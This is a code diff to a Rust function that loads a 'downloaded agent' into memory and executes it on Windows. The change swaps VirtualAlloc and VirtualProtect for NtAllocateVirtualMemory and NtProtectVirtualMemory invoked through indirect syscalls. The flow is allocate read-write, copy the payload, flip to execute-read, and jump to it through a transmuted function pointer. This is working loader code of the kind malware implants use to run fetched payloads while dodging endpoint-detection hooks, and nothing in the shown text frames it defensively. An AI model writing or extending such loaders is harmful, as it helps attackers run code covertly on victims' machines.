@@ -95,36 +95,54 @@ fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-/// Executes the downloaded agent in memory
+/// Executes the downloaded agent in memory using indirect syscalls
 fn execute_agent(_agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     // Allocate memory for the agent
     #[cfg(target_os = "windows")]
     {
-        use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+        use std::ffi::c_void;
+        use dinvk::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCurrentProcess};
 
         unsafe {
-            // Allocate as RW
-            let addr = VirtualAlloc(
-                std::ptr::null_mut(),
-                _agent_bytes.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
+            // Allocate as RW using indirect syscall
+            let mut base_address: *mut c_void = std::ptr::null_mut();
+            let mut region_size = _agent_bytes.len();
+            
+            let status = NtAllocateVirtualMemory(
+                NtCurrentProcess(),
+                &mut base_address,
+                0,
+                &mut region_size,
+                0x3000, // MEM_COMMIT | MEM_RESERVE
+                0x04,   // PAGE_READWRITE
             );
 
-            if addr.is_null() {
-                return Err("Failed to allocate memory for agent".into());
+            if status < 0 || base_address.is_null() {
+                return Err("NtAllocateVirtualMemory failed for agent".into());
             }
 
             // Copy agent to memory
-            std::ptr::copy_nonoverlapping(_agent_bytes.as_ptr(), addr as *mut u8, _agent_bytes.len());
+            std::ptr::copy_nonoverlapping(_agent_bytes.as_ptr(), base_address as *mut u8, _agent_bytes.len());
 
-            // Change to RX
-            let mut old_protect = 0u32;
-            VirtualProtect(addr, _agent_bytes.len(), PAGE_EXECUTE_READ, &mut old_protect);
+            // Change to RX using indirect syscall
+            let mut base = base_address;
+            let mut size = _agent_bytes.len();
+            let mut old_protect: u32 = 0;
+            
+            let status = NtProtectVirtualMemory(
+                NtCurrentProcess(),
+                &mut base,
+                &mut size,
+                0x20, // PAGE_EXECUTE_READ
+                &mut old_protect,
+            );
+
+            if status < 0 {
+                return Err("NtProtectVirtualMemory failed for agent".into());
+            }
 
             // Execute agent
-            let agent_entry: extern "C" fn() = std::mem::transmute(addr);
+            let agent_entry: extern "C" fn() = std::mem::transmute(base_address);
             agent_entry();
         }
         
